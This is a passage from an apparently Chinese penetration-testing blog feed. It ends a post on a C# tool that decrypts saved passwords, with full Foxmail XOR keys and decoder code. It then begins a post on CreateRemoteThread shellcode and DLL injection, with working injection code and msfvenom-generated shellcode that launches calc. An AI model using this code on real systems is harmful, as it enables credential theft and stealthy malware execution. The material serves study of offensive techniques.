(Encoding.UTF8.GetString(Convert.FromBase64String(XE.GetElementsByTagName(<span class="string">"Pass"</span>)[<span class="number">0</span>].InnerText)));</span><br><span class="line">                            <span class="keyword">if</span> (!<span class="keyword">string</span>.IsNullOrEmpty(Host) &amp;&amp; !<span class="keyword">string</span>.IsNullOrEmpty(Port) &amp;&amp; !<span class="keyword">string</span>.IsNullOrEmpty(User) &amp;&amp; !<span class="keyword">string</span>.IsNullOrEmpty(Pass))</span><br><span class="line">                            &#123;</span><br><span class="line">                                Console.WriteLine(<span class="string">"&#123;0,-20&#125;&#123;1,-8&#125;&#123;2,-15&#125;&#123;3,-15&#125;"</span>, Host, Port, User, Pass);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">catch</span> &#123; &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> &#123; &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>​        效果如下</p><p><img src="/image/【编程】SharpDecryptPwd/blog_2019-08-26_10-17-43.png" alt=""></p><h2 id="0x06-Foxmail"><a href="#0x06-Foxmail" class="headerlink" title="0x06 Foxmail"></a>0x06 Foxmail</h2><p><code>Foxmail</code> 将输入的密码和一个固定字符串做异或加密，然后在前面添加字符串 <code>Password</code> ，用于标记作用。</p><table><tr><th width="20%" bgcolor="#eea236">版本号 </th><th width="40%" bgcolor="#eea236">存储文件 </th><th width="40%" style="text-align:center" bgcolor="rgb(92," 184,="" 92)="">固定异或字符串(加密密钥)</th></tr><tr><td> Version 6.X </td><td> Account.stg -v6.5</td><td> ~draGon~  第一位异或值：5A</td></tr><tr><td> Version 7.X </td><td> Accounts.tdat -v7.0 Account.rec0 -v7.1</td><td> ~F@7％m$~  第一位异或值：71</td></tr></table><p>至于为什么是这个值，可以直接逆向查看，或者看看这篇文章 <a href="https://wenku.baidu.com/view/1fcaf49cda38376baf1faeff" target="_blank" rel="noopener">foxmail 邮箱密码密码原理和方法研究</a>。</p><p><strong>Foxmail Version 6.x 加密方法：</strong> </p><ul><li><p>将原密文的第一位 16进制与 <code>5A</code> 进行 <code>XOR异或</code> 操作，然后替换掉原密文的第一位后，得到一个新密文</p>  <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span>A 的由来</span><br><span class="line"><span class="keyword">string</span> key = <span class="string">"~draGon~"</span>;</span><br><span class="line"><span class="keyword">byte</span>[] data = Encoding.Default.GetBytes(key);</span><br><span class="line"><span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; data.Length; i++)</span><br><span class="line">&#123;</span><br><span class="line">x += <span class="keyword">int</span>.Parse(data[i].ToString());</span><br><span class="line">&#125;</span><br><span class="line">x %= <span class="number">255</span>;</span><br><span class="line">Console.WriteLine(x); <span class="comment">// 90 =&gt; 5A</span></span><br></pre></td></tr></table></figure></li><li><p>再将新密文从第二位开始分别与密钥 <code>~draGon~</code>（7E647261476F6E7E）进行 <code>XOR异或</code>，并将此时得到的密文与原密文进行相减，得到明文的 16进制。</p></li><li><p><code>Account.stg</code>  文件使用二进制格式存储并在前 <code>0x800 字节</code>内填充了一些十六进制数据，之后才是真正的账户信息，包括 POP3 和 SMTP 账户、密码。</p></li><li><p>POP3 和 SMTP 账户密码分别用 “POP3Password” 和 “ESMTPPassword” 来代表。密码使用十六进制格式并用 XOR 异或加密，密钥为“~draGon~”。</p></li></ul><p><strong>版本 7.X 同理。</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> Foxmail password decoder</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> Credit: Jacob Soo</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> https://github.com/jacobsoo/FoxmailRecovery/blob/c3263424dd961ec23868d03c9caad13fa5c017ee/Foxmail%20Password%20Recovery/Foxmail%20Password%20Recovery/SharedFunctions.cs#L72</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> https://github.com/lim42snec/foxmaildump/blob/ca29edc6d767b4e52ee939cdad1d0f8cd7c9f626/FoxmailDump.cpp#L34</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="ver"&gt;</span>版本号<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="pHash"&gt;</span>密文<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span><span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">decodePW</span>(<span class="params"><span class="keyword">int</span> ver, String strHash</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            String decodedPW = <span class="string">""</span>;</span><br><span class="line">            <span class="comment">// 第一步：定义不同版本的秘钥</span></span><br><span class="line">            <span class="keyword">int</span>[] a;</span><br><span class="line">            <span class="comment">// fc0 的值是根据版本密钥，以字节为单位将16进制密文转成10进制，十进制之和求余。（x %=255;）</span></span><br><span class="line">            <span class="keyword">int</span> fc0;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ver == <span class="number">0</span>) <span class="comment">// Version 6</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span>[] v6a = &#123; <span class="string">'~'</span>, <span class="string">'d'</span>, <span class="string">'r'</span>, <span class="string">'a'</span>, <span class="string">'G'</span>, <span class="string">'o'</span>, <span class="string">'n'</span>, <span class="string">'~'</span> &#125;;</span><br><span class="line">                a = v6a;</span><br><span class="line">                fc0 = Convert.ToInt32(<span class="string">"5A"</span>, <span class="number">16</span>); <span class="comment">//90</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="comment">// Version 7</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span>[] v7a = &#123; <span class="string">'~'</span>, <span class="string">'F'</span>, <span class="string">'@'</span>, <span class="string">'7'</span>, <span class="string">'%'</span>, <span class="string">'m'</span>, <span class="string">'$'</span>, <span class="string">'~'</span> &#125;;</span><br><span class="line">                a = v7a;</span><br><span class="line">                fc0 = Convert.ToInt32(<span class="string">"71"</span>, <span class="number">16</span>); <span class="comment">// 113</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 第二步：以字节为单位将16进制密文转成10进制</span></span><br><span class="line">            <span class="keyword">int</span> size = strHash.Length / <span class="number">2</span>; </span><br><span class="line">            <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span>[] b = <span class="keyword">new</span> <span class="keyword">int</span>[size];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                </span><br><span class="line">                b[i] = Convert.ToInt32(strHash.Substring(index, <span class="number">2</span>), <span class="number">16</span>);</span><br><span class="line">                index = index + <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 第三步：将第一个元素替换成与指定数异或后的结果</span></span><br><span class="line">            <span class="keyword">int</span>[] c = <span class="keyword">new</span> <span class="keyword">int</span>[b.Length];</span><br><span class="line"></span><br><span class="line">            c[<span class="number">0</span>] = b[<span class="number">0</span>] ^ fc0;</span><br><span class="line"></span><br><span class="line">            Array.Copy(b, <span class="number">1</span>, c, <span class="number">1</span>, b.Length - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 第四步：不断扩容拷贝自身</span></span><br><span class="line">            <span class="keyword">while</span> (b.Length &gt; a.Length)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span>[] newA = <span class="keyword">new</span> <span class="keyword">int</span>[a.Length * <span class="number">2</span>];</span><br><span class="line">                Array.Copy(a, <span class="number">0</span>, newA, <span class="number">0</span>, a.Length);</span><br><span class="line">                Array.Copy(a, <span class="number">0</span>, newA, a.Length, a.Length);</span><br><span class="line">                a = newA;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span>[] d = <span class="keyword">new</span> <span class="keyword">int</span>[b.Length];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; b.Length; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                d[i - <span class="number">1</span>] = b[i] ^ a[i - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span>[] e = <span class="keyword">new</span> <span class="keyword">int</span>[d.Length];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; d.Length - <span class="number">1</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (d[i] - c[i] &lt; <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    e[i] = d[i] + <span class="number">255</span> - c[i];</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    e[i] = d[i] - c[i];</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                decodedPW += (<span class="keyword">char</span>)e[i];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> decodedPW;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>到目前为止，此版本支持 6.5 至 7.2 版的数据恢复，但是这里只是测试了 7.2版本，效果如下</p><p><img src="/image/【编程】SharpDecryptPwd/blog_2019-10-11_17-49-10.png" alt=""></p><h2 id="来源参考"><a href="#来源参考" class="headerlink" title="来源参考"></a>来源参考</h2><p><a href="https://github.com/DoubleLabyrinth/how-does-navicat-encrypt-password" target="_blank" rel="noopener">https://github.com/DoubleLabyrinth/how-does-navicat-encrypt-password</a><br><a href="http://www.zcgonvh.com/post/SQL_Server_Management_Studio_saved_password_dumper.html" target="_blank" rel="noopener">SQL Server Management Studio密码导出工具</a><br><a href="https://github.com/zcgonvh/SSMSPwd" target="_blank" rel="noopener">https://github.com/zcgonvh/SSMSPwd</a><br><a href="https://github.com/DoubleLabyrinth/how-does-Xmanager-encrypt-password" target="_blank" rel="noopener">https://github.com/DoubleLabyrinth/how-does-Xmanager-encrypt-password</a><br><a href="https://cloud.tencent.com/developer/news/261135" target="_blank" rel="noopener">https://cloud.tencent.com/developer/news/261135</a><br><a href="https://www.t00ls.net/viewthread.php?tid=51996&amp;extra=&amp;highlight=teamview&amp;page=1" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php?tid=51996&amp;extra=&amp;highlight=teamview&amp;page=1</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是一篇对密码已保存在 Windwos 系统上的部分程序进行解析。&lt;/p&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="C#" scheme="https://rcoil.me/tags/C/"/>
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
      <category term="编程之道" scheme="https://rcoil.me/tags/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
      <category term="Decrypt" scheme="https://rcoil.me/tags/Decrypt/"/>
    
  </entry>
  
  <entry>
    <title>【知识回顾】进程注入-第一部分</title>
    <link href="https://rcoil.me/2019/09/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/"/>
    <id>https://rcoil.me/2019/09/【知识回顾】进程注入-第一部分/</id>
    <published>2019-09-01T06:37:56.000Z</published>
    <updated>2019-10-31T15:42:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>通过 <code>CreateRemoteThread</code> API 进行代码与 DLL 注入。</p><a id="more"></a><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>某日看到收藏夹里头的 <a href="https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process" target="_blank" rel="noopener">Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques</a> ，里头总结得很到位，在国内的几个流行的安全媒体上也见过译文。</p><p>通过对进程注入技术的学习和理解，个人觉得整个过程非常有趣，故以此作为 C# 代码学习的方向（Windows API 利用），并编写有助于学习和开发的代码。</p><p><strong>注意： </strong>我不是第一个编写这样代码的人，Github 有一大堆代码示例。</p><h2 id="0x01-什么是进程注入"><a href="#0x01-什么是进程注入" class="headerlink" title="0x01 什么是进程注入"></a>0x01 什么是进程注入</h2><p>进程注入是一种广泛应用于恶意软件和无文件攻击中的逃避技术，这意味着可以将自定义代码运行在另一个进程的地址空间内。进程注入提高了隐蔽性，也实现了持久化。尽管有非常多的进程注入技术，本文所述是最常用的进程注入技术之一。</p><h2 id="0x02-VirtualAllocEx-gt-WriteProcessMemory-模式"><a href="#0x02-VirtualAllocEx-gt-WriteProcessMemory-模式" class="headerlink" title="0x02 VirtualAllocEx =&gt; WriteProcessMemory 模式"></a>0x02 <strong>VirtualAllocEx</strong> =&gt; <strong>WriteProcessMemory</strong> 模式</h2><p><code>CreateRemoteThread</code> 是 Win32 API 提供的一个函数，用于在另一个进程中创建线程。在另一个应用程序中创建线程之前，必须满足两个条件。</p><ul><li><p>尝试在另一个进程中创建线程的进程必须具有创建线程的权限。简单来说，必须有与目标进程相同或更高的权限（目标指的是我们想要创建线程的进程）</p></li><li><p>两个进程必须在同一会话中。如果会话标识符不匹配，则不会创建线程。</p></li></ul><p>如果不满足上述任何一个条件，则操作系统本身将拒绝代码注入这一过程。这不是 Windows 操作系统体系结构中的安全漏洞，而是由操作系统提供的功能。由于我们无法修改具有比我们更高权限的进程，因此不会跨越任何安全边界。</p><p>为了通过 <code>CreateRemoteThread</code> API 实现代码注入，我们遵循以下流程：</p><p><img src="/image/【知识回顾】进程注入-第一部分/CreateRemoteThread 进程注入流程图.png" alt=""></p><p>代码示意：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">public static void CodeInject(int pid, byte[] buf)</span><br><span class="line">&#123;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        uint lpNumberOfBytesWritten = 0;</span><br><span class="line">        uint lpThreadId = 0;</span><br><span class="line">        Console.WriteLine($&quot;  [&gt;] 获取进程ID &#123;pid&#125; 的句柄.&quot;);</span><br><span class="line">        IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)pid);</span><br><span class="line">        Console.WriteLine($&quot;  [&gt;] 打开进程id &#123; pid &#125; 的句柄 &#123;pHandle&#125;.&quot;);</span><br><span class="line">        Console.WriteLine($&quot;  [&gt;] 分配内存以注入shellcode.&quot;);</span><br><span class="line">        IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)buf.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);</span><br><span class="line">        Console.WriteLine($&quot;  [&gt;] Shellcode 的内存分配在 0x&#123;rMemAddress&#125;.&quot;);</span><br><span class="line">        Console.WriteLine($&quot;  [&gt;] 在已分配的内存位置写入shellcode&quot;);</span><br><span class="line">        if (WriteProcessMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten))</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine($&quot;  [&gt;] Shellcode写在进程内存中.&quot;);</span><br><span class="line">            Console.WriteLine($&quot;  [&gt;] 创建远程线程来注入 shellcode.&quot;);</span><br><span class="line">            IntPtr hRemoteThread = CreateRemoteThread(pHandle, IntPtr.Zero, 0, rMemAddress, IntPtr.Zero, 0, ref lpThreadId);</span><br><span class="line">            bool hCreateRemoteThreadClose = CloseHandle(hRemoteThread);</span><br><span class="line">            Console.WriteLine($&quot;  [&gt;] 成功将 shellcode 注入进程id &#123;pid&#125; 的内存中.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine($&quot;  [!] 无法将shellcode注入进程id &#123;pid&#125; 的内存中.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        bool hOpenProcessClose = CloseHandle(pHandle);</span><br><span class="line">    &#125;</span><br><span class="line">    catch (Exception ex)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(&quot;[+] &quot; + Marshal.GetExceptionCode());</span><br><span class="line">        Console.WriteLine(ex.Message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Cobalt Strike</code> 提供了两种在远程进程中分配内存并将数据复制到其中的选项，而其中默认使用项就是使用了 <strong>VirtualAllocEx</strong> -&gt; <strong>WriteProcessMemory</strong> 的经典模式，这模式也是红队工具中最常见的模式。此模式也适用于不同的进程体系结构。</p><p>当然，一个好的实现需要考虑到出现不同的极端情况，比如 x86 -&gt; x64， x64 -&gt; x86，不同上下文等，不过这不是本文的内容。</p><h2 id="0x03-深入了解函数"><a href="#0x03-深入了解函数" class="headerlink" title="0x03 深入了解函数"></a>0x03 深入了解函数</h2><h3 id="3-1-访问远程进程"><a href="#3-1-访问远程进程" class="headerlink" title="3.1 访问远程进程"></a>3.1 访问远程进程</h3><p>要对任何进程执行内存操作，我们必须能够访问到它。可以通过使用 <code>OpenProcess</code> 函数获得，该函数原型是：</p><p><img src="/image/【知识回顾】进程注入-第一部分/blog_2019-09-02_15-56-38.png" alt=""></p><p>它需要 3 个参数：</p><ul><li><p><strong>DwDesiredAccess：</strong>对进程对象的请求访问权限。它将根据受害者进程的安全描述符进行检查。如果调用者启用了 <code>SeDebugPrivilege</code> 特权，则无论安全描述符的内容如何，都会授予所请求的访问权限。</p></li><li><p><strong>bInheritHandle：</strong>如果此值为 TRUE，则此进程创建的进程将继承该句柄。否则，进程不会继承此句柄。</p></li><li><strong>dwProcessId：</strong>这是受害者进程的进程标识符。</li></ul><p>如果函数成功，则返回值是指定进程的打开句柄，其他 API函数可以使用它来操作受害进程的内存。失败时，返回 NULL。</p><h3 id="3-2-为-shellcode-分配空间"><a href="#3-2-为-shellcode-分配空间" class="headerlink" title="3.2 为 shellcode 分配空间"></a>3.2 为 shellcode 分配空间</h3><p>一旦我们获得进程的句柄，我们继续为内存中的 shellcode 分配空间。这是通过使用 <code>VirtualAllocEx</code> API 调用完成的。</p><p><img src="/image/【知识回顾】进程注入-第一部分/blog_2019-09-02_16-10-46.png" alt=""></p><p>它需要 5 个参数：</p><ul><li><strong>hProcess：</strong>进程的句柄。该函数在此进程的虚拟地址空间内分配内存。句柄必须具有<strong>PROCESS_VM_OPERATION</strong>访问权限。</li><li><strong>lpAddress：</strong>指向受害者进程内存中指定地址的指针。如果参数指定为 NULL，则该函数回自动选择要分配的内存页面。</li><li><strong>dwSize：</strong>要分配的内存区域的大小，它以字节为单位。</li><li><strong>flAllocationType：</strong>指定要分配的内存类型。此参数必须包含以下值之一。：MEM_COMMIT、MEM_RESERVE、MEM_RESET、MEM_RESET_UNDO。</li><li><strong>flProtect：</strong>要分配的页面区域的内存保护。出于我们的目的，它将包含我们要执行的代码，并且我们希望它可读可写，我们将其设置为 PAGE_EXECUTE_READWRITE。</li></ul><p>该函数在成功时返回分配的基址，而失败时，返回 NULL。</p><p>此时我们已经成功设法在进程中分配可执行内存。</p><h3 id="3-3-在远程进程中写入-shellcode"><a href="#3-3-在远程进程中写入-shellcode" class="headerlink" title="3.3 在远程进程中写入 shellcode"></a>3.3 在远程进程中写入 shellcode</h3><p>现在，我们需要在分配的区域中写入 shellcode。为此，我们有一个名为 <code>WriteProcessMemory</code> 的函数。</p><p><code>WriteProcessMemory</code> 是一个函数，它将调用者的数据写入指定进程的内存区域。需要注意的时整个内存区域必须时可写的，否则函数会失败，这就是为什么我们要将内存分配为可写，并与可读和可执行文件一起分配。</p><p><img src="/image/【知识回顾】进程注入-第一部分/blog_2019-09-02_16-33-57.png" alt=""></p><p>它需要 5 个参数。</p><ul><li><strong>hProcess：</strong>要修改的进程内存的句柄。句柄必须具有 PROCESS_VM_WRITE 和 PROCESS_VM_OPERATION 访问权限。</li><li><strong>lpBaseAddress：</strong>指向写入数据的指定进程中的基址的指针（我们想要写入数据的地址）。在发生数据传输之前，系统会验证指定大小的基址和内存中的所有数据是否都可以进行写访问，如果无法访问，则该函数将失败。</li><li><strong>lpBuffer：</strong>指向缓冲区的指针，指针补习时const指针。该缓冲区包含要在指定进程的地址空间中写入的数据。</li><li><strong>nSize：</strong>要写入指定进程的字节数。</li><li><strong>lpNumberOfBytesWritten：</strong>指向变量的指针，该变量接收传输到指定进程的字节数。此参数是可选的。如果 <em>lpNumberOfBytesWritten</em> 为 <strong>NULL</strong>，则忽略该参数。</li></ul><p>如果函数由于某些原因而失败，则返回 false，如果成功则返回 true。</p><p>此时，stage 已全部设置，所需的只是在远程进程中创建一个线程并运行它。</p><h3 id="3-4-执行-shellcode"><a href="#3-4-执行-shellcode" class="headerlink" title="3.4 执行 shellcode"></a>3.4 执行 shellcode</h3><p>为了在远程进程中创建线程，我们使用 Win32 API 提供的 <code>CreateRemoteThread</code> 函数。</p><p><img src="/image/【知识回顾】进程注入-第一部分/blog_2019-09-02_17-10-28.png" alt=""></p><p>它需要 7 个参数，其中只有 3 个是我们感兴趣的。其余的可以通过调整它们获得默认值，可以对新创建的线程进行更多控制。</p><p>我们感兴趣的参数是：</p><ul><li><strong>hProcess：</strong>要创建线程的进程的句柄。</li><li><strong>lpStartAddress：</strong>它是指向 <em>THREADSTARTROUTINE</em> 的指针，THREADSTARTROUTINE 是线程创建后开始执行代码的位置。</li><li><strong>lpParameter：</strong>指向 <em>LPTHREAD_START_ROUTINE</em> 所需参数的指针。因为在这种情况下，它是一个普通的shellcode，它不期望任何参数，因此，我们将它保持为 NULL 。此参数在 DLL 注入中具有价值。</li></ul><h2 id="0x04-演示"><a href="#0x04-演示" class="headerlink" title="0x04 演示"></a>0x04 演示</h2><p>利用 msfvenom 生成 shellcode</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">rcoil@MacBookPro  ~  msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b "\x00" -f hex</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x64 from the payload</span><br><span class="line">Found 3 compatible encoders</span><br><span class="line">Attempting to encode payload <span class="keyword">with</span> <span class="number">1</span> iterations <span class="keyword">of</span> generic/<span class="keyword">none</span></span><br><span class="line">generic/<span class="keyword">none</span> <span class="keyword">failed</span> <span class="keyword">with</span> <span class="keyword">Encoding</span> <span class="keyword">failed</span> due <span class="keyword">to</span> a bad <span class="built_in">character</span> (<span class="keyword">index</span>=<span class="number">7</span>, <span class="built_in">char</span>=<span class="number">0x00</span>)</span><br><span class="line">Attempting <span class="keyword">to</span> <span class="keyword">encode</span> payload <span class="keyword">with</span> <span class="number">1</span> iterations <span class="keyword">of</span> x64/<span class="keyword">xor</span></span><br><span class="line">x64/<span class="keyword">xor</span> succeeded <span class="keyword">with</span> <span class="keyword">size</span> <span class="number">311</span> (iteration=<span class="number">0</span>)</span><br><span class="line">x64/<span class="keyword">xor</span> chosen <span class="keyword">with</span> <span class="keyword">final</span> <span class="keyword">size</span> <span class="number">311</span></span><br><span class="line">Payload <span class="keyword">size</span>: <span class="number">311</span> <span class="keyword">bytes</span></span><br><span class="line"><span class="keyword">Final</span> <span class="keyword">size</span> <span class="keyword">of</span> <span class="keyword">hex</span> <span class="keyword">file</span>: <span class="number">622</span> <span class="keyword">bytes</span></span><br><span class="line"><span class="number">4831</span>c94881e9deffffff488d05efffffff48bbc690bbfdf6dbd2a448315827482df8ffffffe2f43ad83819063312a4c690faacb78b80f590d88a2f939359f6a6d830afee9359f6e6d8308fa693dd138cdaf6cc3f93e3646aacda81f4f7f2e50759b6bcf71a304994d1eab57d89f22f84acf3fc2650522cc690bbb5731ba6c38e916bad7d93cae04dd09bb4f70b31f28e6f72bc7def5aecc746f6cc3f93e3646ad17a34fb9ad365fe70ce0cbad89e80ced5822c83038ae04dd09fb4f70bb4e54d9cf3b97d9bceedc740fa76f2539aa516d1e3bcae858bfe87c8faa4b7819a272ab0faaf093b8ae59fcaf376e432855b396fe6b54cdad2a4c690bbfdf6935f29c791bbfdb761e32fa91744284d3bcf8eccd1015b63664f5b13d83839dee7d4d8cc10401d83de69e3d5e2d497f682932d1c6f6e9e97b7b1a4</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/image/【知识回顾】进程注入-第一部分/blog_2019-09-02_18-02-31.png" alt=""></p><h2 id="0x05-DLL-注入"><a href="#0x05-DLL-注入" class="headerlink" title="0x05 DLL 注入"></a>0x05 DLL 注入</h2><h3 id="5-1-什么是DLL？"><a href="#5-1-什么是DLL？" class="headerlink" title="5.1 什么是DLL？"></a>5.1 什么是DLL？</h3><p>动态链接库（DLL）是一个包含代码的文件，程序已加载该文件以在运行时执行一个或多个操作。</p><h3 id="5-2-什么是DLL注入？"><a href="#5-2-什么是DLL注入？" class="headerlink" title="5.2 什么是DLL注入？"></a>5.2 什么是DLL注入？</h3><p>DLL 注入是一个将 DLL 注入到正在运行中的进程的过程，该进程可能包含恶意代码，可用于执行恶意活动。</p><h3 id="5-3-相关函数"><a href="#5-3-相关函数" class="headerlink" title="5.3 相关函数"></a>5.3 相关函数</h3><ul><li><a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea" target="_blank" rel="noopener">GetModuleHandleA</a> 